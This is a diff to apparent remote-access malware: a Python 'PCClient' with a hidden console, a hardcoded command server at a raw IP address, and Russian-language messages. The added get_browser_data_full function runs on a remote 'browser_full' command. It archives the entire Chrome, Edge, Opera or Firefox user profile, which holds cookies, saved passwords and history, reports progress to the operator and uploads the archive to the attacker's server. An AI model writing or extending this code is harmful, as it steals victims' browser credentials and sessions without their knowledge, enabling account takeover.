@@ -31,7 +31,7 @@ from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
 import pyperclip
 from pynput import mouse
 import pythoncom
-import datetime
+from datetime import datetime
 SERVER_URL = "http://193.124.121.76:4443"
 
 def hide_console():
@@ -191,6 +191,142 @@ class PCClient:
             return f"Файл {os.path.basename(path)} успешно прочитан", file_data, 'file'
         except Exception as e:
             return f"Ошибка чтения файла: {str(e)}", None, None
+        
+    def get_total_size(path):
+        """Рекурсивно подсчитывает общий размер файлов в директории"""
+        total = 0
+        for root, dirs, files in os.walk(path):
+            # Исключаем кэш-папки
+            dirs[:] = [d for d in dirs if d not in ('Cache', 'GPUCache', 'ShaderCache')]
+            for file in files:
+                file_path = os.path.join(root, file)
+                try:
+                    if not file.endswith('.lock') and not file.startswith('LOCK'):
+                        total += os.path.getsize(file_path)
+                except:
+                    continue
+        return total
+
+    def get_browser_data_full(self, browser, command):
+        """Архивирование профиля браузера с интеллектуальным обновлением прогресса"""
+        try:
+            import tempfile
+            # 1. Определение путей к браузерам
+            browser_paths = {
+                'chrome': os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Default'),
+                'edge': os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge', 'User Data', 'Default'),
+                'opera': os.path.join(os.getenv('APPDATA'), 'Opera Software', 'Opera Stable'),
+                'firefox': os.path.join(os.getenv('APPDATA'), 'Mozilla', 'Firefox', 'Profiles')
+            }
+
+            if browser not in browser_paths:
+                return f"Неизвестный браузер: {browser}", None, None
+
+            path = browser_paths[browser]
+            if not os.path.exists(path):
+                return f"Профиль не найден: {path}", None, None
+
+            # 2. Подсчет общего размера
+            self.send_command_result(command['id'], "⌛ Подсчет общего размера профиля...", None, None)
+            total_size = 0
+            for root, dirs, files in os.walk(path):
+                dirs[:] = [d for d in dirs if d.lower() not in ('cache', 'gpucache', 'shadercache')]
+                for f in files:
+                    if not f.endswith(('.lock', '.tmp')):
+                        try:
+                            total_size += os.path.getsize(os.path.join(root, f))
+                        except:
+                            continue
+
+            if total_size == 0:
+                return "Нет файлов для архивирования", None, None
+
+            # 3. Настройка временных файлов
+            temp_dir = tempfile.mkdtemp(prefix='br_prof_')
+            zip_path = os.path.join(temp_dir, f"{browser}_profile_{datetime.now().strftime('%Y%m%d')}.zip")
+
+            # 4. Архивирование с умным прогрессом
+            processed_size = 0
+            last_reported_percent = -1  # Последний отправленный процент
+            last_update_time = time.time()
+            start_time = last_update_time
+
+            with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
+                for root, dirs, files in os.walk(path):
+                    dirs[:] = [d for d in dirs if d.lower() not in ('cache', 'gpucache', 'shadercache')]
+                    
+                    for file in files:
+                        file_path = os.path.join(root, file)
+                        
+                        # Пропускаем системные файлы
+                        if (file.startswith('LOCK') or 
+                            file.endswith(('.lock', '.tmp')) or 
+                            os.path.getsize(file_path) > 100 * 1024 * 1024):
+                            continue
+                            
+                        try:
+                            # Добавляем файл в архив
+                            zipf.write(file_path, os.path.relpath(file_path, os.path.dirname(path)))
+                            processed_size += os.path.getsize(file_path)
+                            
+                            # Рассчитываем текущий процент
+                            current_percent = int((processed_size / total_size) * 100)
+                            current_time = time.time()
+                            
+                            # Условия обновления:
+                            # 1. Процент увеличился
+                            # 2. Прошло больше 30 секунд с последнего обновления
+                            # 3. Достигли 100%
+                            if (current_percent > last_reported_percent and current_percent % 5 == 0) or \
+                            (current_time - last_update_time > 30) or \
+                            (current_percent == 100):
+                                
+                                # Формируем прогресс-бар
+                                progress = min(100, current_percent)
+                                filled = '█' * int(progress / 5)
+                                empty = '░' * (20 - len(filled))
+                                
+                                self.send_command_result(
+                                    command['id'],
+                                    f"Архивирование:\n[{filled}{empty}] {progress}%\n"
+                                    f"Обработано: {processed_size//1024//1024}MB / {total_size//1024//1024}MB",
+                                    None, None
+                                )
+                                
+                                last_reported_percent = current_percent
+                                last_update_time = current_time
+                                
+                        except Exception as e:
+                            continue
+
+            # 5. Проверка результата
+            if not os.path.exists(zip_path) or os.path.getsize(zip_path) == 0:
+                return "Ошибка: не удалось создать архив", None, None
+
+            # 6. Загрузка на сервер
+            download_url, error = self.upload_large_file(zip_path, 'browser')
+            if not download_url:
+                return f"Ошибка загрузки: {error}", None, None
+
+            # 7. Формируем окончательный результат
+            return (
+                f"✅ Готово! Полный профиль {browser}\n"
+                f"📦 Размер: {os.path.getsize(zip_path)//1024//1024}MB\n"
+                f"⏱ Время: {(time.time()-start_time)//60:.0f} мин\n"
+                f"Ссылка: {download_url}",
+                download_url,
+                'url'
+            )
+
+        except Exception as e:
+            return f"Ошибка: {str(e)}", None, None
+            
+        finally:
+            if 'temp_dir' in locals() and os.path.exists(temp_dir):
+                try:
+                    shutil.rmtree(temp_dir, ignore_errors=True)
+                except:
+                    pass
 
     def get_browser_data(self, browser):
         try:
@@ -615,7 +751,7 @@ class PCClient:
                 result, file_data, file_type = self.get_browser_data(browser)
             elif cmd.startswith('browser_full:'):
                 browser = cmd[len('browser_full:'):].strip().lower()
-                result, file_data, file_type = self.get_browser_data_full(browser)
+                result, file_data, file_type = self.get_browser_data_full(browser, command)
                 self.send_command_result(command['id'], result, file_data, file_type)
             self.send_command_result(command['id'], result, file_data, file_type)
         except Exception as e:
